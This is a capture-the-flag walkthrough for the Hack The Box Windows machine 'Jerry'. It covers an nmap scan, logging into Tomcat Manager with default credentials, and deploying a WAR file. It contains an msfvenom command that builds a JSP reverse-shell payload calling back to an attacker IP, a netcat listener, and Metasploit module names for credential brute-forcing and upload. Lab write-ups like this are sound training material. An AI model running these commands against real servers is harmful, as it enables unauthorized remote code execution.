## Hack The Box - Jerry (10.10.10.95)
Jerry is a medium box from Hack The Box and it is a Windows machine. This machine demonstrates poor practice in the use of default credentials and a lack of file upload sanitization.  
Our methodology will be to enumerate until we find an attack surface to obtain our initial foothold. In this scenario, we may not need to perform privilege escalation due to the nature of our exploitation. Watch the video walkthough on Youtube HERE or read along.

### ENUMERATION:
To begin with, we will start a Nmap scan on our target as part of our first enumeration steps. For this, I will opt to use nmapAutomator, although you can run a traditional Nmap scan.

```markdown
# Nmap 7.91 scan initiated Sat Dec 18 13:22:41 2021 as: nmap -sC -sV -Pn -oA nmap 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.053s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 18 13:22:57 2021 -- 1 IP address (1 host up) scanned in 15.29 seconds
```

I notice from our scan that port 8080 is hosting Apache Tomcat. Let’s go ahead and visit our webpage and poke around. 
[homepage1.png]
It seems to be a default installation as hinted by the top banner “If you’re seeing this, you’ve succesfully installed Tomcat. Congradulations!” We notice the option on the right hand side to access either Server Status, Manager App, or Host Manager – all very intresting options and a possible attack surface. 
Upon clicking on Manager App I am presented with a login box: 
[login_prompt2.png]
Considering this is a default installation, defualts credentials would normally be a good start. I guessed the wrong credentials on my first login attempt, but was promptly greeted with a error page which provided the default credentials of tomcat:s3cret.
[default_credentials3.png]
I can now login to the Tomcat Web Application Manager. If you’re unfamiliar with this tool, the Tomcat Manager is a web application that can be used to interactively to deploy and manage web applications. With that being said, upon furthur inspection of this web page we notice at the bottom more detailed information about our server and the ability to deploy .WAR files directly from this page. We have found our  attack surface for the initial foothold. 


### EXPLOITATION: 
If you’re unfamiliar with a .WAR file, it is simply a .JAR file but contains only web related Java files like Servlets, JSP, and HTML. We will be exploiting the ability to upload and deploy these .WAR files directly from the Manager App webpage to our victim machine by crafting a malicous .WAR file as our payload to call back to our attacker machine. 

Time to get our intial foothold. We will craft our payload using msfvenom utilizing the ‘java/jsp_shell_reverse_tcp’ payload formated as a war file. Before executing the following command, ensure that 10.10.10.10. is replace with your attacker machine’s IP address. 

```markdown
Msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=1337 -f war -o Payload.war
```

Now let us upload our shell via the Manager App web page.
[payload5.png]
We can now see our payload populate at the top of the page under Applications. In order to catch our reverse TCP shell we must set up a listener first. We will catch this reverse shell utilizing Netcat. To do this, execute the below command and ensure that the port listed in this command is the same declared in our msfvenom command from earlier. 

```markdown
nc -lvnp 1337
```

With our listener established on port 1337 we may now execute our payload on the victim machine. To do so, simply click your payload’s name under the Application second of the web page.
[application6.png]
In a few seconds, we should have a connection on our Netcat listener providing us with a shell to our victim machine! 
[shell7.png]

### Privledge Eslcation:
In this scenario, privlege escalation is not required. Upon running the ‘whoami’ command on our victim’s machine we notice we are already NT AUTHORITY\SYSTEM. You can find your flags in C:\Users\Administrator\Desktop\flags listed under a file “2 for the price of 1.txt”. 

### Closing Remarks:
Although manual enumeration and exploitation was performed, metasploit modules do exist for this scenario. Utilize ```markdown ‘auxilary/scanner/http/tomcat_mgr_login’ ``` to bruce force the defualt login credentials for our Manager App followed by ```markdown ‘multi/http/tomcat_mgr_upload’ ``` to automatically craft, upload, and deploy your payload. Metasploit will create a listener and catch the reverse TCP shell for you! 
Thanks for reading! 


